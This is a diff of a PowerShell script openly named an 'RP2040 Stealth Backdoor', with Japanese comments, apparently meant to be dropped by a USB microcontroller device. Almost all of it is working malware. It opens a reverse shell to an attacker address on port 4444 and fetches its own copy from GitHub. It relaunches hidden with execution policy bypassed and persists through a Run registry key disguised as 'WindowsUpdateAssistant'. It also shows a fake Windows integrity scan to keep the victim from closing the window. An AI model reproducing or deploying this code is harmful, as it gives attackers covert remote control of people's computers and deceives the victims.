@@ -1,10 +1,16 @@
-# --- RP2040 Stealth Backdoor (Final Optimized Version) ---
+# --- RP2040 Stealth Backdoor (Robust Background Version) ---
 # GitHub: 0rnot/RP2040/main/backdoor.ps1
+
+param(
+    [string]$LHOST = "192.168.0.248",
+    [int]$LPORT = 4444,
+    [switch]$Background
+)
 
 function Start-ReverseShell {
     param(
-        [string]$LHOST = "127.0.0.1",
-        [int]$LPORT = 4444,
+        [string]$LHOST,
+        [int]$LPORT,
         [switch]$Background
     )
 
@@ -19,7 +25,7 @@ function Start-ReverseShell {
                 $Writer = New-Object System.IO.StreamWriter($Stream); $Writer.AutoFlush = $true
                 $Reader = New-Object System.IO.StreamReader($Stream)
 
-                $Writer.WriteLine("--- RP2040 Background Session: $($env:COMPUTERNAME) ---")
+                $Writer.WriteLine("--- RP2040 Session: $($env:COMPUTERNAME) @ $(Get-Date) ---")
                 $Writer.Write("PS " + (Get-Location).Path + "> ")
 
                 while($TCPClient.Connected) {
@@ -38,53 +44,54 @@ function Start-ReverseShell {
                 }
                 $TCPClient.Close()
             } catch {
-                # 接続失敗時は30秒待機してリトライ
                 Start-Sleep -Seconds 30
             }
         }
         return
     }
 
-    # --- 2. デコイモード (可視ターミナルからの起動) ---
-
-    # 自身の保存
+    # --- 2. デコイモード (可視ターミナル) ---
+    
+    # 永続化保存
     if (-not (Test-Path $DestPath)) {
         (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0rnot/RP2040/main/backdoor.ps1", $DestPath)
     }
 
-    # バックグラウンドプロセスの生成 (WScript.Shellを使用)
-    # 現在のターミナルとは独立したプロセスとして起動
-    $ScriptBlock = ". '$DestPath'; Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background"
-    $LaunchCommand = "powershell.exe -ExecutionPolicy Bypass -Command `"$ScriptBlock`""
-    
+    # バックグラウンド起動
+    # 引数 -Background を付けて自分自身をもう一度起動する
+    $LaunchCommand = "powershell.exe -ExecutionPolicy Bypass -File `"$DestPath`" -LHOST $LHOST -LPORT $LPORT -Background"
     try {
         $WshShell = New-Object -ComObject WScript.Shell
         $WshShell.Run($LaunchCommand, 0, $false)
     } catch {
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -Command `"$ScriptBlock`"" -WindowStyle Hidden
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$DestPath`" -LHOST $LHOST -LPORT $LPORT -Background" -WindowStyle Hidden
     }
 
-    # 永続化設定 (再起動後も非表示で実行)
+    # 永続化レジストリ登録
     $RegCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `". '$DestPath'; Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background`""
     Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateAssistant' -Value $RegCommand
 
-    # デコイ画面の表示
+    # おとり画面
     Clear-Host
-    Write-Host "Microsoft Windows [Version 10.0.19045.4170]" -ForegroundColor Gray
+    Write-Host "Microsoft Windows [Version 10.0.19045.4170]"
     Write-Host "(c) Microsoft Corporation. All rights reserved."
     Write-Host ""
-    Write-Host "Starting system maintenance..." -ForegroundColor Cyan
-    Start-Sleep -Seconds 2
+    Write-Host "System Optimization in progress..." -ForegroundColor Cyan
+    Start-Sleep -Seconds 1
     
-    $prog = @(15, 32, 47, 68, 89, 94, 99)
-    foreach ($p in $prog) {
-        Write-Host "`rScanning system files... [$p%]" -NoNewline
-        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 4)
+    $steps = @(10, 25, 48, 62, 85, 99, 100)
+    foreach ($s in $steps) {
+        Write-Host "`rChecking system integrity: $s%" -NoNewline
+        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
     }
-    Write-Host "`rScanning system files... [100%]"
-    Write-Host "Optimization complete. Monitoring system stability..." -ForegroundColor Green
-    Write-Host "Please do not close this window to ensure background tasks complete successfully."
+    Write-Host "`rSystem Integrity: OK. Monitoring security state..." -ForegroundColor Green
+    Write-Host "Please do not close this window for a few minutes."
     
-    # ターミナルを維持
     while($true) { Start-Sleep -Seconds 60 }
+}
+
+# --- 3. 実行エントリーポイント ---
+# スクリプトが読み込まれた時に、引数があれば即実行する
+if ($MyInvocation.InvocationName -ne 'Start-ReverseShell') {
+    Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background:$Background
 }
